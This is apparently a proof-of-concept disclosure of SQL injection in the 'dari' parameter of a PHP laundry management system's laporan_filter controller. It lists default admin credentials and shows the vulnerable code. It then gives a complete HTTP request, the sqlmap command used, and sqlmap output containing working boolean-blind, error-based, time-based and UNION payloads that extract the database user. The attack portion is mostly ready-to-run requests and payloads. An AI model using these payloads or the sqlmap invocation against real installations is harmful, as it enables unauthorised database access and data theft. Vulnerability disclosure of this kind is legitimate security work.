Laundry Management System SQL Injection on (/application/controller/Transaki.php) 

Vendor Homepage:

```
https://www.sourcecodester.com/php-ci-laundry-management-system-source-code
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Crudentials:

```
admin
admin123
```

Affected Page:

```
/application/controller/Transaki.php
```

The potential injection point is located within the `laporan_filter` function in `Transaki.php`. This function directly utilizes the `$dari` and `$sampai` variables to construct a database query without employing parameterized queries or proper data sanitization measures.

```
	public function laporan_filter()
	{
		$user['username'] = $this->session->userdata('username');

		$dari = $this->input->post('dari');
		$sampai = $this->input->post('sampai');

		$data['data_transaksi'] = $this->data_transaksi->filter($dari, $sampai)->result();

		$this->load->view('header');
		$this->load->view('navigation', $user);
		$this->load->view('laporan/laporan_transaksi', $data);
		$this->load->view('footer');
		$this->load->view('source');
	}
```

Proof of vulnerability:

Request:

```
POST /ci_laundry/transaksi/laporan_filter HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://localhost
Sec-GPC: 1
Connection: close
Referer: http://localhost/ci_laundry/transaksi/laporan
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14; ci_session=8u304rgjn04iv4m3mrloksfrovf11plm
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

dari=2024-04-08*&sampai=2024-04-10
```

```
python3 sqlmap.py -r 1.txt --current-user --batch --dbms mysql
```

```
15:27:39] [INFO] (custom) POST parameter '#1*' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[15:27:39] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 130 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: dari=2024-04-08' OR NOT 3497=3497#&sampai=2024-04-10

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: dari=2024-04-08' AND GTID_SUBSET(CONCAT(0x7170767871,(SELECT (ELT(3131=3131,1))),0x71706a7a71),3131)-- ZroO&sampai=2024-04-10

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: dari=2024-04-08' AND (SELECT 5148 FROM (SELECT(SLEEP(5)))LbJE)-- mmGJ&sampai=2024-04-10

    Type: UNION query
    Title: MySQL UNION query (NULL) - 22 columns
    Payload: dari=2024-04-08' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7170767871,0x6779454a506e527576764f42536e6c65664c7142634361566a4d56584f71694f756b536665587048,0x71706a7a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#&sampai=2024-04-10
---
[15:27:39] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.6
[15:27:40] [INFO] fetching current user
current user: 'root@localhost'
```

